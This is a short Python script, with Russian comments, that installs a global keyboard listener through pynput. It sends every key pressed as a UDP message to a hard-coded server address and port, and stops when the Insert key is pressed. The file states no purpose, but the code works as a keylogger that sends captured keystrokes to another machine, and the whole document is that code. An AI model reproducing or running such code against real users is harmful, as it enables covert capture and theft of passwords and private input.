#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pynput import keyboard

import socket
import pickle as pl
import time

def SendMessage(msg):
    client.sendto(str(msg).encode('utf-8'), (IP, PORT))
    
def OnPress(key):
    global listener
    print("Press ", key)
    #Остановка листенера
    SendMessage(key)
    if key == keyboard.Key.insert: #Остановка на нужную кнопку
        listener.stop() #Остановка
        

def OnRelease(key):
    print("Release ", key)

IP = '192.168.8.177' #айпи сервера
PORT = 8000 #порт сервера

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #создаем udp клиент

listener = keyboard.Listener(on_press = OnPress, on_release = OnRelease)

listener.start()

listener.join()
